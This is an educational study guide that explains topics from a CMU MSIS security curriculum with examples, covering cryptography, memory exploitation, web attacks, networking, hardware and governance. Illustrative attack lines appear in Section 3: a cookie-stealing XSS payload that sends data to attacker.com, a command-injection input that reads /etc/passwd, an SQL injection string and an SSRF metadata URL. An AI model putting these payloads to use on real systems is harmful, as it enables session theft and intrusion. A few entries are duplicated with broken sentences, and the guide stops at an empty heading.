# CMU MSIS Handbook: Topics Explained with Examples

This document provides a comprehensive explanation of the topics covered in the Carnegie Mellon University (CMU) MSIS Handbook, supplemented with practical examples to enhance understanding.


## Chapter 1: 14-741 - Foundations of Cryptography & Access Control

This chapter lays the groundwork for cybersecurity by exploring the fundamental principles of cryptographic design, security modeling, access control, and identity verification.

### 1.1 Introduction to Cryptographic Science

**Cryptography** is the practice and study of techniques for secure communication in the presence of adversarial behavior. It involves transforming information (plaintext) into an unreadable format (ciphertext) to ensure **confidentiality**, **integrity**, and **authenticity**. A core principle is **Kerckhoffs's Principle**, which states that a cryptosystem should be secure even if everything about the system, except the key, is public knowledge. This means the security relies solely on the secrecy of the key, not on the obscurity of the algorithm.

**Example:** Imagine sending a secret message to a friend. Instead of inventing a new, complex way to scramble letters that no one knows (security by obscurity), you use a well-known encryption method like AES. The security of your message then depends entirely on keeping the AES key secret between you and your friend. If the key is compromised, the message can be read, even if the AES algorithm is publicly known.

### 1.2 Symmetric Key Ciphers and Block Cipher Modes

**Symmetric key cryptography** uses a single, shared secret key for both encrypting and decrypting data. **Block ciphers**, such as the Advanced Encryption Standard (AES), operate on fixed-size blocks of data (e.g., 128 bits for AES). They use a series of substitutions and permutations (Substitution-Permutation Networks - SPN) over multiple rounds to transform plaintext into ciphertext. The **block cipher mode of operation** dictates how multiple blocks are processed. For instance, **Electronic Codebook (ECB) mode** encrypts each block independently, which is insecure as identical plaintext blocks produce identical ciphertext blocks, revealing patterns. **Cipher Block Chaining (CBC) mode** addresses this by XORing each plaintext block with the preceding ciphertext block, using an **Initialization Vector (IV)** for the first block to introduce randomness and prevent pattern exposure.

**Example:**
*   **ECB Mode (Insecure):** If you encrypt an image with large areas of uniform color using ECB, the encrypted image will still show the outlines of the original image (like the famous ECB Penguin). This is because each identical color block is encrypted into an identical ciphertext block.
*   **CBC Mode (Secure):** When the same image is encrypted with CBC, the output appears as random noise. The IV and chaining mechanism ensure that even identical plaintext blocks produce different ciphertext blocks, hiding any patterns.

### 1.3 Asymmetric Cryptosystems & Discrete Logarithms

**Asymmetric cryptography**, also known as public-key cryptography, uses a pair of keys: a **public key** for encryption and a **private key** for decryption. This solves the key distribution problem inherent in symmetric cryptography. Its security relies on **Trapdoor One-Way Functions**, mathematical operations easy to compute in one direction but computationally infeasible to reverse without a specific piece of information (the private key). RSA's security, for example, is based on the difficulty of **prime factorization**, while Diffie-Hellman key exchange and Elliptic Curve Cryptography (ECC) rely on the **Discrete Logarithm Problem**. ECC offers comparable security with much smaller key sizes, making it efficient for resource-constrained devices.

**Example:**
*   **RSA:** Alice wants to send a secret message to Bob. Bob generates a public/private key pair and shares his public key with Alice. Alice encrypts her message using Bob's public key. Only Bob, with his private key, can decrypt and read the message. The security relies on the fact that factoring large numbers (to find Bob's private key from his public key) is extremely difficult.
*   **Diffie-Hellman:** Alice and Bob want to agree on a shared secret key over an insecure channel without ever directly exchanging the key. They use Diffie-Hellman to mathematically derive a common secret, even if an eavesdropper intercepts all their communications. The security is based on the difficulty of solving the discrete logarithm problem.

### 1.4 Hash Functions, SHA-3, and HMAC Signatures

**Cryptographic hash functions** take arbitrary-length input data and produce a fixed-size output, called a **digest** or hash value (e.g., 256 bits for SHA-256). A secure hash function must possess three properties:
1.  **Pre-image resistance:** It's computationally infeasible to find the original input from its hash value.
2.  **Second pre-image resistance:** It's computationally infeasible to find a different input that produces the same hash as a given input.
3.  **Collision resistance:** It's computationally infeasible to find any two different inputs that produce the same hash output.

**SHA-3 (Keccak)** uses a sponge construction, making it resistant to hash length extension attacks that affected older algorithms like SHA-1 and SHA-2. **Hash-based Message Authentication Codes (HMAC)** combine a cryptographic hash function with a secret key to verify both data **integrity** (data hasn't been altered) and **authenticity** (data comes from a legitimate sender).

**Example:**
*   **Password Storage:** Instead of storing user passwords directly, websites store their hash values. When a user logs in, their entered password is hashed, and this new hash is compared to the stored hash. If they match, the password is correct. This protects against attackers who might steal the database, as they only get hash values, not the actual passwords.
*   **File Integrity:** You download a software file and its SHA-256 hash. After downloading, you calculate the SHA-256 hash of your downloaded file. If your calculated hash matches the provided hash, you can be confident that the file has not been tampered with during download.
*   **HMAC for API Calls:** An API client sends a request with a message and an HMAC. The server, knowing the same secret key, recomputes the HMAC for the received message. If the computed HMAC matches the received HMAC, the server knows the message is authentic and hasn't been altered in transit.

### 1.5 Access Control Models: DAC, MAC, RBAC, and ABAC

**Access control** mechanisms enforce authorization rules, determining who can access what resources and what actions they can perform. Different models exist:
*   **Discretionary Access Control (DAC):** Resource owners define access permissions. Users can grant or revoke access to their own resources. **Example:** A user creates a file and decides to share it with specific other users, granting them read-only access. This is common in personal computers and many cloud storage services, often managed via **Access Control Lists (ACLs)**.
*   **Mandatory Access Control (MAC):** A central authority (e.g., operating system kernel) enforces strict, system-wide security policies based on security labels (e.g., 
confidential, secret, top secret) and data classifications. Users cannot override these policies. **Example:** In a military system, a user with a 'Secret' clearance can only access documents classified as 'Secret' or below, regardless of who owns the document. This is often used in highly secure environments.
*   **Role-Based Access Control (RBAC):** Permissions are grouped into **roles** (e.g., Administrator, Editor, Viewer), and users are assigned to these roles. **Example:** In a content management system, a 'Writer' role might have permissions to create and edit articles, while an 'Editor' role can also publish articles. Assigning a user to the 'Writer' role automatically grants them all associated permissions.
*   **Attribute-Based Access Control (ABAC):** The most flexible model, where access decisions are made dynamically based on various **attributes** of the user (e.g., department, location), the resource (e.g., sensitivity, type), and the environment (e.g., time of day, IP address). **Example:** A policy might state: 

*   **Attribute-Based Access Control (ABAC):** The most flexible model, where access decisions are made dynamically based on various **attributes** of the user (e.g., department, location), the resource (e.g., sensitivity, type), and the environment (e.g., time of day, IP address). **Example:** A policy might state: "Only employees from the 'Finance' department, accessing from a company-issued device within office hours, can view 'Confidential Financial Reports'." This allows for very fine-grained control.

### 1.6 Formal Security Policies: Bell-LaPadula, Biba, and Clark-Wilson

Formal security models provide a mathematical framework to describe and enforce security policies. They are crucial for designing highly secure systems.

*   **Bell-LaPadula Model:** Primarily concerned with **confidentiality** in multi-level security systems. It enforces two key rules:
    *   **Simple Security Property (No Read Up):** A subject (user) cannot read an object (data) at a higher security level. **Example:** A user with a 'Confidential' clearance cannot read a document classified as 'Secret'.
    *   ***-Property (No Write Down):** A subject cannot write to an object at a lower security level. **Example:** A user with 'Secret' clearance cannot write information to a 'Confidential' document, preventing information flow from higher to lower security levels.

*   **Biba Integrity Model:** Focuses strictly on **data integrity**, aiming to prevent unauthorized modification of data. It enforces the opposite rules of Bell-LaPadula:
    *   **Simple Integrity Property (No Read Down):** A subject cannot read an object at a lower integrity level. **Example:** A system administrator (high integrity) should not read data from an untrusted public forum (low integrity) to prevent contamination.
    *   ***-Integrity Property (No Write Up):** A subject cannot write to an object at a higher integrity level. **Example:** A user with low integrity (e.g., guest user) cannot modify a critical system configuration file (high integrity).

*   **Clark-Wilson Model:** Designed for commercial systems, focusing on preventing fraud and unauthorized modifications. It uses concepts like **well-formed transactions** and **separation of duties**. **Example:** In a banking system, a 
Clark-Wilson model: Designed for commercial systems, preventing fraud and unauthorized modifications by utilizing 'well-formed transactions' and 'separation of duties' across resources. **Example:** In a banking system, a transaction to transfer funds might require one person to initiate it and another to approve it (separation of duties), and the system ensures the transaction follows predefined rules (well-formed transaction) to prevent fraud.

### 1.7 Authentication Protocols: Kerberos, PKI, and OAuth 2.0

**Authentication** verifies the identity of a user or system. Various protocols are used for this purpose:

*   **Kerberos:** An enterprise network authentication protocol that uses a trusted **Key Distribution Center (KDC)** to issue cryptographic tickets. This prevents sending passwords over insecure networks. **Example:** When an employee logs into a corporate network, Kerberos issues them a Ticket-Granting Ticket (TGT) and then Service Tickets for accessing specific resources, all without sending their password across the network.
*   **Public Key Infrastructure (PKI):** Manages digital certificates issued by a trusted **Certificate Authority (CA)** using X.509 standards. PKI is fundamental for secure communication over the internet. **Example:** When you visit a secure website (HTTPS), your browser uses PKI to verify the website's digital certificate, ensuring that you are communicating with the legitimate website and not an imposter.
*   **OAuth 2.0:** An industry-standard **authorization framework** that allows third-party applications to obtain limited access to user accounts without sharing passwords. **Example:** When you log into a third-party application (e.g., a photo editing app) using your Google or Facebook account, OAuth 2.0 allows the app to access specific information (like your profile picture) without ever seeing your Google/Facebook password. **SAML (Security Assertion Markup Language)** and **OIDC (OpenID Connect)** are related protocols often used for **Single Sign-On (SSO)** across enterprise web services.

## Chapter 2: 14-735 - Secure Coding & Vulnerability Science

This chapter focuses on secure coding practices and understanding software vulnerabilities, analyzing low-level process memory layouts and compiler mitigations.

### 2.1 Process Memory Internals: Stack, Heap, and Registers

Understanding how a program uses memory is crucial for both exploiting and securing software. Key memory regions include:

*   **Text Segment:** Contains the compiled machine code of the program.
*   **Data Segment:** Stores initialized global and static variables.
*   **BSS Segment:** Stores uninitialized global variables.
*   **Heap:** Used for **dynamically allocated memory** (e.g., using `malloc` or `new` in C++). Memory is managed by system allocators.
*   **Stack:** A Last-In, First-Out (LIFO) structure used for **local function variables**, function arguments, and return addresses. When a function is called, a new stack frame is pushed onto the stack; when it returns, the frame is popped.

**CPU Registers** (e.g., EAX, ESP, EBP, EIP/RIP) control the execution flow. The **Instruction Pointer (EIP/RIP)** points to the next instruction to be executed.

**Example:** When a C function `int add(int a, int b)` is called, `a` and `b` are pushed onto the stack, along with the return address (where the program should resume after `add` finishes). Local variables declared inside `add` also reside on the stack. If `add` dynamically allocates memory using `malloc`, that memory comes from the heap.

### 2.2 Stack-Based Buffer Overflows & Shellcode Injection

A **stack-based buffer overflow** occurs when a program writes more data to a buffer located on the stack than it was allocated to hold. This overwrites adjacent memory, including critical data like the **Saved Frame Pointer (SFP)** and the **Return Address**. An attacker can overwrite the Return Address with the memory address of malicious code (**shellcode**) they have injected. When the function attempts to return, the CPU jumps to and executes the attacker's shellcode.

**Example:** Consider a C function that copies user input into a fixed-size buffer on the stack without checking the input length:

```c
void vulnerable_function(char *input) {
    char buffer[16];
    strcpy(buffer, input); // No bounds checking!
}
```

If an attacker provides an `input` string longer than 16 characters, it will overflow `buffer`, eventually overwriting the return address on the stack. The attacker can craft the input to include malicious shellcode and an address that points to this shellcode, causing the program to execute it instead of returning to its legitimate caller.

### 2.3 Heap Exploitation: Corrupting Allocator Bins

**Heap exploitation** targets dynamically allocated memory. Unlike the stack, the heap doesn't directly contain return addresses. Instead, exploits often involve corrupting the metadata used by heap allocators (like `ptmalloc` or `jemalloc`) to manage memory chunks (bins). Common heap vulnerabilities include:

*   **Double-Free:** Freeing the same memory pointer twice. This can corrupt the allocator's internal data structures, allowing an attacker to write arbitrary values to arbitrary memory locations (a 
"Write-What-Where" exploit).
*   **Use-After-Free (UAF):** A program continues to use a pointer after the memory it points to has been freed. If an attacker can manipulate the allocator to reassign that memory to an object they control, the program will unknowingly use the attacker's data when it accesses the old pointer.

**Example:** Imagine a program that allocates memory for a user object, frees it, but then later tries to access a function pointer within that object. If an attacker can allocate a new object in the same memory space and overwrite the function pointer with the address of their shellcode, the program will execute the shellcode when it attempts to call the original function.

### 2.4 Compiler & OS Exploitation Mitigations and Bypasses

Modern operating systems and compilers employ mitigations to make exploitation harder:

*   **Address Space Layout Randomization (ASLR):** Randomizes the memory addresses of the stack, heap, and shared libraries on every boot. This makes it difficult for attackers to predict the memory addresses needed for their exploits.
*   **Data Execution Prevention (DEP/NX):** Marks memory regions like the stack and heap as non-executable. This prevents the execution of injected shellcode.
*   **Stack Canaries:** Randomized values placed on the stack before the return address. If a buffer overflow occurs, the canary is corrupted, and the program detects the tampering and aborts before the return address is used.

Attackers use techniques like **Return-Oriented Programming (ROP)** to bypass these mitigations. ROP involves chaining together existing, safe assembly instructions (called "gadgets") found in executable memory (like shared libraries) to perform malicious actions, bypassing DEP since no new code is injected.

**Example:** To bypass DEP, an attacker might use ROP to find a gadget that pops a value into a register, another gadget that calls a system function (like `system()`), and chain them together to execute a command, all using code that is already present and marked as executable.

### 2.5 Logic Flaws, Integer Overflows, and Format String Vulnerabilities

Besides memory corruption, software can suffer from logical and integer errors:

*   **Integer Overflows:** Occur when an arithmetic operation results in a value larger than the maximum size the integer type can hold, causing it to wrap around to a small or negative number. This can lead to allocating insufficient memory, which is then overflowed.
*   **Format String Vulnerabilities:** Occur when user input is passed directly to output formatting functions (like `printf` in C) without proper format specifiers. Attackers can use format specifiers like `%x` to read memory or `%n` to write arbitrary data to memory.

**Example:**
*   **Integer Overflow:** A program calculates the size of an array to allocate: `size = num_elements * element_size`. If `num_elements` is very large, the multiplication might overflow, resulting in a small `size`. The program allocates a small buffer but then tries to copy `num_elements` into it, causing a massive buffer overflow.
*   **Format String:** If a program uses `printf(user_input);` instead of `printf("%s", user_input);`, an attacker can input `%x %x %x` to read values from the stack, potentially revealing sensitive information or memory addresses.

### 2.6 Static & Dynamic Security Auditing (SAST, DAST, Fuzzing)

Identifying vulnerabilities requires rigorous auditing:

*   **Static Application Security Testing (SAST):** Analyzes source code without executing it, looking for insecure coding patterns and known vulnerable APIs.
*   **Dynamic Application Security Testing (DAST):** Inspects running applications by sending various inputs and payloads to identify active vulnerabilities.
*   **Fuzzing:** An automated technique that involves providing invalid, unexpected, or random data as input to a program to find coding errors and security loopholes. Coverage-guided fuzzers (like AFL) monitor code execution paths to maximize the code tested.

**Example:** A SAST tool might flag the use of the insecure `strcpy` function in C code. A DAST tool might send SQL injection payloads to a web application's login form to see if it's vulnerable. A fuzzer might generate thousands of malformed image files and feed them to an image viewer to see if any cause a crash, indicating a potential vulnerability.

### 2.7 Secure Software Development Life Cycle (SSDLC)

The **Secure Software Development Life Cycle (SSDLC)** integrates security practices throughout the entire software development process, rather than treating it as an afterthought. This includes:

*   **Architectural Threat Modeling:** Identifying potential threats during the design phase.
*   **Secure Coding Standards:** Adhering to guidelines like OWASP or CERT C.
*   **Automated Security Testing:** Integrating SAST, DAST, and fuzzing into CI/CD pipelines.
*   **Penetration Testing:** Engaging third-party experts to test the application's security before release.

**Example:** A company adopting SSDLC will require developers to undergo secure coding training, use SAST tools in their IDEs, and ensure that every code commit is automatically scanned for vulnerabilities before it can be merged into the main codebase.

## Chapter 3: 14-828 - Web Application & Browser Security Engineering

This chapter delves into the security mechanisms of web browsers and the vulnerabilities common in web applications.

### 3.1 Web Browser Architecture & Sandboxing Models

Modern web browsers use a **multi-process architecture** to enhance stability and security. The main **Browser Process** manages the application state, while individual **Renderer Processes** handle parsing HTML, CSS, and executing JavaScript for each tab. Renderer processes are **sandboxed**, meaning they run with restricted operating system privileges. This prevents a malicious website from compromising the entire system even if it exploits a vulnerability in the rendering engine.

**Example:** If you visit a malicious website that exploits a vulnerability in the browser's JavaScript engine, the sandbox prevents the malicious code from accessing your local files or installing malware on your computer, as the renderer process lacks the necessary permissions.

### 3.2 Same-Origin Policy (SOP) & Cross-Origin Resource Sharing (CORS)

The **Same-Origin Policy (SOP)** is a fundamental security concept that restricts how a document or script loaded from one origin can interact with a resource from another origin. An **origin** is defined by the combination of **Protocol, Host, and Port**. SOP prevents a malicious script on one page from accessing sensitive data on another page.

**Cross-Origin Resource Sharing (CORS)** is a mechanism that allows servers to specify which origins are permitted to access their resources, relaxing the SOP in a controlled manner. Misconfigured CORS (e.g., allowing `*` origins with credentials) can lead to severe security vulnerabilities.

**Example:**
*   **SOP:** A script running on `https://attacker.com` cannot read the cookies or access the DOM of `https://bank.com` because they have different origins.
*   **CORS:** If `https://api.example.com` wants to allow requests from `https://www.example.com`, it can send a CORS header: `Access-Control-Allow-Origin: https://www.example.com`.

### 3.3 Cross-Site Scripting (XSS) & Bypass Methodologies

**Cross-Site Scripting (XSS)** occurs when an application includes untrusted data in a web page without proper validation or escaping. This allows attackers to execute malicious scripts in the victim's browser.

*   **Reflected XSS:** The malicious script is reflected off the web server, such as in an error message or search result. The payload is typically delivered via a crafted link.
*   **Stored XSS:** The malicious script is permanently stored on the target server (e.g., in a database, forum post, or comment). The script executes when a user views the stored content.
*   **DOM-based XSS:** The vulnerability exists in the client-side code rather than the server-side code. The payload is executed as a result of modifying the DOM environment in the victim's browser.

**Example:** An attacker posts a comment on a blog containing `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`. If the blog doesn't sanitize this input, anyone viewing the comment will have their session cookie sent to the attacker's server (Stored XSS).

### 3.4 Request Forgeries: CSRF, SSRF, and IDOR

Request forgeries exploit trust relationships:

*   **Cross-Site Request Forgery (CSRF):** Exploits the trust a web application has in a user's browser. It forces an authenticated user to execute unwanted actions on a web application in which they are currently authenticated.
*   **Server-Side Request Forgery (SSRF):** Occurs when a web application fetches a remote resource without validating the user-supplied URL. This allows an attacker to coerce the application to make requests to unintended destinations, often internal systems or cloud metadata endpoints.
*   **Insecure Direct Object References (IDOR):** Occurs when an application provides direct access to objects based on user-supplied input without proper authorization checks.

**Example:**
*   **CSRF:** An attacker tricks a logged-in bank user into clicking a link that submits a hidden form to transfer funds to the attacker's account. The browser automatically includes the user's session cookies, making the request appear legitimate to the bank.
*   **SSRF:** An application allows users to provide a URL to fetch an image. An attacker provides `http://169.254.169.254/latest/meta-data/` (AWS metadata endpoint) to retrieve sensitive cloud credentials.
*   **IDOR:** A user accesses their profile via `https://example.com/profile?id=123`. If they change the ID to `124` and can view another user's profile without authorization, it's an IDOR vulnerability.

### 3.5 Injection Attacks: SQLi, Command Injection, and XXE

Injection attacks occur when untrusted data is sent to an interpreter as part of a command or query.

*   **SQL Injection (SQLi):** Occurs when user input is improperly incorporated into a database query. This allows attackers to view, modify, or delete database records.
*   **Command Injection:** Occurs when an application passes unsafe user supplied data to a system shell. This allows attackers to execute arbitrary operating system commands.
*   **XML External Entity (XXE):** Occurs when an application parses XML input containing a reference to an external entity. This can lead to disclosure of confidential data, denial of service, or SSRF.

**Example:**
*   **SQLi:** A login form uses the query `SELECT * FROM users WHERE username = '` + user_input + `' AND password = '...'`. An attacker enters `' OR '1'='1` as the username, making the query `SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '...'`, which always evaluates to true, bypassing authentication.
*   **Command Injection:** An application takes a hostname as input and runs `ping <hostname>`. An attacker inputs `example.com; cat /etc/passwd`, causing the server to execute both the ping command and the command to read the password file.

### 3.6 Session Management, Tokens, and Cryptographic Cookies

Secure session management is critical for maintaining user state securely. This involves using high-entropy, unpredictable session identifiers or cryptographic tokens like **JSON Web Tokens (JWT)**.

Cookies used for session management should be protected with specific flags:
*   **HttpOnly:** Prevents client-side scripts (like JavaScript) from accessing the cookie, mitigating the risk of XSS cookie theft.
*   **Secure:** Ensures the cookie is only transmitted over encrypted (HTTPS) connections.
*   **SameSite:** Controls whether the cookie is sent with cross-site requests, providing robust protection against CSRF attacks.

**Example:** A secure web application issues a session cookie after login and sets the `HttpOnly` and `Secure` flags. Even if the application has an XSS vulnerability, the attacker's JavaScript cannot read the session cookie to hijack the account.

### 3.7 Content Security Policy (CSP) & Web Defense Headers

**Content Security Policy (CSP)** is an HTTP response header that allows site administrators to declare approved sources of content that the browser may load. It is a primary defense against XSS by restricting where scripts can be loaded from and preventing the execution of inline scripts.

Other important security headers include:
*   **HTTP Strict Transport Security (HSTS):** Forces browsers to interact with the site only over secure HTTPS connections.
*   **X-Frame-Options:** Prevents the site from being framed by other sites, mitigating clickjacking attacks.
*   **X-Content-Type-Options:** Prevents the browser from MIME-sniffing a response away from the declared content-type.

**Example:** A website sets a CSP header: `Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com;`. This tells the browser to only load resources from the site's own origin and scripts from the site itself or a specific trusted CDN, blocking any malicious scripts injected by an attacker.

## Chapter 4: 14-760 - Advanced Network Architecture & Transport Layer Audits

This chapter covers the complexities of network architectures, routing protocols, and the security mechanisms operating at various network layers.

### 4.1 Stateful Transmission & TCP Congestion Mechanics

The **Transmission Control Protocol (TCP)** is a connection-oriented, stateful protocol that ensures reliable data delivery. It uses a **three-way handshake** (SYN, SYN-ACK, ACK) to establish a connection. TCP manages reliability through sequence numbers, acknowledgments, and retransmissions. It also employs **congestion control algorithms** (like Reno or Cubic) to adjust transmission rates based on network conditions, preventing network collapse.

**Example:** When you download a file, TCP ensures that all packets arrive in the correct order and without errors. If a packet is lost due to network congestion, TCP detects the missing acknowledgment and retransmits the packet, while also slowing down its transmission rate to alleviate the congestion.

### 4.2 Layer 2 Switching Vulnerabilities & Spoofing

Layer 2 (Data Link Layer) protocols, designed for local networks, often lack built-in security and trust all connected devices. This makes them susceptible to spoofing attacks.

**Address Resolution Protocol (ARP)** maps IP addresses to MAC addresses. Because ARP is stateless and unauthenticated, devices accept unsolicited ARP replies. In an **ARP Poisoning** attack, an attacker sends fake ARP messages to associate their MAC address with the IP address of another device (like the default gateway), allowing them to intercept or modify traffic.

**Example:** In a coffee shop Wi-Fi network, an attacker uses ARP poisoning to tell your laptop that their MAC address belongs to the router. Your laptop then sends all its internet traffic to the attacker, who can inspect it before forwarding it to the actual router.

### 4.3 Layer 3 Routing Security: OSPF and BGP Hijacking

Layer 3 (Network Layer) handles routing across networks. Interior gateway protocols (like OSPF) route within an organization, while exterior gateway protocols, primarily **Border Gateway Protocol (BGP)**, route traffic across the global internet.

BGP relies on trust between Autonomous Systems (AS). In a **BGP Hijacking** attack, a malicious or misconfigured AS advertises false routing information, claiming it is the best path to a specific IP prefix. This redirects global traffic intended for that prefix through the attacker's network.

**Example:** An attacker wants to intercept traffic destined for a popular cryptocurrency exchange. They use BGP hijacking to announce that their network is the most direct route to the exchange's IP addresses. Internet routers update their tables, and users' traffic is routed to the attacker instead of the legitimate exchange.

### 4.4 Software-Defined Networking (SDN) & Virtualization

**Software-Defined Networking (SDN)** separates the network's **Control Plane** (routing logic) from the **Data Plane** (physical forwarding hardware). This allows administrators to manage network behavior centrally via software controllers.

**Network Function Virtualization (NFV)** replaces dedicated hardware appliances (like firewalls or load balancers) with software running on virtual machines.

**Example:** Instead of manually configuring dozens of physical switches, a network administrator uses an SDN controller to deploy a new security policy across the entire network instantly. Using NFV, they can spin up a new virtual firewall instance to handle increased traffic without needing to purchase and install new physical hardware.

### 4.5 Packet Sniffing, Decryption, and Deep Packet Inspection (DPI)

**Packet sniffing** involves capturing raw network traffic using a network interface card in promiscuous mode. **Deep Packet Inspection (DPI)** goes beyond examining basic headers and analyzes the application-layer payload of packets in real-time.

**Example:** A security analyst uses a packet sniffer like Wireshark to capture traffic on a network segment to troubleshoot a connectivity issue. An enterprise firewall uses DPI to inspect the contents of HTTP traffic to detect and block malware downloads or prevent employees from accessing unauthorized applications.

### 4.6 Cryptographic Transport Protocols: TLS, IPSec, and SSH

Securing network communications requires encryption:

*   **Transport Layer Security (TLS):** Secures application-layer protocols (like HTTPS). It uses a handshake to authenticate the server, negotiate encryption algorithms, and establish session keys for encrypting data.
*   **IPSec:** Operates at the Network Layer (Layer 3) to secure IP communications by authenticating and encrypting each IP packet. It is commonly used for creating Virtual Private Networks (VPNs).
*   **Secure Shell (SSH):** Provides a secure channel over an unsecured network, typically used for remote command-line login and execution.

**Example:** When you access your bank's website, TLS encrypts the communication between your browser and the bank's server, ensuring that anyone intercepting the traffic cannot read your login credentials or financial data.

### 4.7 Zero-Trust Network Architecture & Micro-segmentation

**Zero-Trust Network Architecture (ZTNA)** discards the traditional perimeter-based security model. It assumes that threats exist both inside and outside the network and requires strict verification for every user and device attempting to access resources, regardless of their location.

**Micro-segmentation** is a key component of ZTNA, dividing the network into small, isolated zones with strict access controls, limiting lateral movement if a breach occurs.

**Example:** In a Zero-Trust environment, even if an attacker compromises an employee's laptop, they cannot freely access other servers on the corporate network. The network is micro-segmented, and the compromised laptop must explicitly authenticate and be authorized to access any other specific resource, which it likely won't be able to do.

## Chapter 5: 14-642 - Embedded Systems & Hardware Security

This chapter explores the unique security challenges associated with physical hardware, microcontrollers, and embedded systems.

### 5.1 Microcontroller Architectures & Constrained Hardware

Embedded systems often use microcontrollers (like ARM Cortex or AVR) that have severe constraints compared to desktop processors. They have limited RAM, storage, and processing power, and often lack advanced security features like virtual memory or privilege separation. They interact directly with hardware peripherals using Memory-Mapped I/O (MMIO).

**Example:** A smart thermostat uses a simple microcontroller with only a few kilobytes of RAM. It doesn't run a full operating system like Windows or Linux; instead, it runs a specialized, lightweight program that directly controls the temperature sensors and Wi-Fi radio.

### 5.2 Real-Time Operating Systems (RTOS) and Secure Semaphores

Many embedded systems use **Real-Time Operating Systems (RTOS)** designed to ensure tasks are executed within strict time constraints. RTOS kernels manage tasks using priority schedulers, mutexes, and semaphores. Because they often operate in a flat memory space without memory protection, a single vulnerability can compromise the entire system.

**Example:** An RTOS controlling a car's anti-lock braking system (ABS) must guarantee that when the brake pedal is pressed, the brakes are applied within milliseconds. If a vulnerability in a non-critical component (like the infotainment system) causes a memory corruption in the RTOS, it could crash the entire system, including the critical ABS functionality.

### 5.3 Physical Hacking Interfaces: UART, JTAG, and SPI

Hardware devices often have physical interfaces used for debugging and testing during manufacturing, which can be exploited by attackers:

*   **UART (Universal Asynchronous Receiver-Transmitter):** A serial interface often used for console access. Connecting to it might provide a root shell.
*   **JTAG (Joint Test Action Group):** An interface for testing and debugging chips. It allows an attacker to halt the CPU, read/write memory, and inject code.
*   **SPI (Serial Peripheral Interface):** A bus used to communicate with peripheral chips, such as external flash memory where firmware is stored.

**Example:** An attacker gains physical access to a smart home hub. They open the casing, locate the UART pins on the circuit board, and connect a serial adapter. This gives them a command-line interface to the device's operating system, potentially allowing them to bypass authentication and gain root access.

### 5.4 Firmware Extraction, Filesystem Parsing, and Reverse Engineering

**Firmware** is the software programmed into read-only memory. Reverse engineering involves extracting this firmware (e.g., by reading the SPI flash chip), parsing its filesystem, and analyzing the code to find vulnerabilities, hardcoded credentials, or hidden backdoors.

**Example:** A security researcher extracts the firmware from a router. They use a tool like `binwalk` to unpack the firmware image, revealing the Linux filesystem. They then analyze the configuration files and discover a hardcoded administrative password that the manufacturer left in the code.

### 5.5 IoT and Embedded Vulnerability Profiles

Internet of Things (IoT) and embedded devices are notorious for poor security practices. Common vulnerabilities include hardcoded passwords, unencrypted communications, outdated software libraries, and a lack of secure update mechanisms.

**Example:** A manufacturer releases a cheap IP camera. It uses a default password of "admin/admin" that cannot be changed, transmits video feeds over unencrypted HTTP, and has no mechanism to receive security patches. This makes it an easy target for attackers to compromise and add to a botnet.

### 5.6 Side-Channel & Physical Fault Injection Attacks

These attacks exploit the physical characteristics of a device rather than software bugs:

*   **Side-Channel Attacks:** Monitor physical emissions like power consumption or electromagnetic radiation during cryptographic operations to deduce secret keys.
*   **Fault Injection Attacks:** Introduce physical stress (like voltage glitches or clock manipulation) to cause the processor to make errors, potentially bypassing security checks or altering execution flow.

**Example:** An attacker wants to extract the encryption key from a smart card. They use an oscilloscope to measure the card's power consumption while it performs encryption. By analyzing the minute variations in power usage, they can mathematically deduce the secret key (Differential Power Analysis).

### 5.7 Secure Boot, TPMs, and Hardware Security Modules (HSM)

Securing hardware requires a **Root of Trust**:

*   **Secure Boot:** Ensures that a device only boots using software that is trusted by the manufacturer, verifying digital signatures at each stage of the boot process.
*   **Trusted Platform Module (TPM) / Hardware Security Module (HSM):** Dedicated hardware components that securely store cryptographic keys and perform cryptographic operations, protecting them from software-based attacks.

**Example:** When a modern laptop boots up, Secure Boot checks the digital signature of the operating system bootloader. If the signature is invalid (e.g., because malware has modified the bootloader), the system refuses to boot, protecting the user from the compromise.

## Chapter 6: 14-817 - Cyber Risk Modeling & Security Governance

This chapter shifts focus from technical details to the business and governance aspects of cybersecurity, including risk management, compliance, and incident response.

### 6.1 Quantitative Risk Modeling & The FAIR Framework

Traditional risk management often uses subjective labels (High, Medium, Low). **Quantitative Risk Modeling** uses mathematical models and financial statistics to measure risk. The **Factor Analysis of Information Risk (FAIR)** framework defines risk as the probable frequency and probable magnitude of future loss, using techniques like Monte Carlo simulations to provide financial estimates of risk.

**Example:** Instead of saying a data breach is a "High" risk, a FAIR analysis might conclude: "There is a 15% probability that a data breach will occur in the next year, resulting in a financial loss between $2 million and $5 million." This provides actionable information for business leaders to justify security investments.

### 6.2 Architectural Threat Modeling: STRIDE & DREAD

**Threat modeling** is a proactive process to identify vulnerabilities during the design phase.

*   **STRIDE:** A methodology to categorize threats: **S**poofing, **T**ampering, **R**epudiation, **I**nformation Disclosure, **D**enial of Service, and **E**levation of Privilege.
*   **DREAD:** A system to rate and prioritize identified threats based on **D**amage, **R**eproducibility, **E**xploitability, **A**ffected users, and **D**iscoverability.

**Example:** During the design of a new web application, the team uses STRIDE to identify that an attacker might try to modify data in transit (Tampering). They then use DREAD to evaluate the risk: the damage would be high, it's easily reproducible, and highly exploitable. This high DREAD score prioritizes the implementation of TLS encryption to mitigate the threat.

### 6.3 Global Compliance & Auditing Standards: ISO, SOC, and NIST

Compliance frameworks provide structured guidelines for managing security:

*   **ISO/IEC 27001:** An international standard for establishing an Information Security Management System (ISMS).
*   **SOC 2 Type II:** An auditing standard that evaluates a service organization's security controls over a period of time based on Trust Services Criteria.
*   **NIST Cybersecurity Framework (CSF):** A flexible framework organized around five core functions: Identify, Protect, Detect, Respond, and Recover.

**Example:** A cloud service provider wants to prove to its customers that it handles data securely. It undergoes a SOC 2 Type II audit, where an independent auditor verifies that the provider's security controls (like access management and encryption) have been operating effectively over the past six months.

### 6.4 Security Governance, Policies, and Vulnerability Lifecycles

**Security Governance** involves creating policies and procedures to manage security. The **Vulnerability Management Lifecycle** is a continuous process of identifying, classifying, prioritizing, remediating, and verifying vulnerabilities, supported by automated scanning and patch management.

**Example:** A company establishes a policy that all critical security patches must be applied within 48 hours of release. Their vulnerability management process involves weekly automated scans to identify missing patches, prioritizing them based on severity, and deploying them using an automated patch management system.

### 6.5 Incident Response Plans, Red-Teaming, and Drills

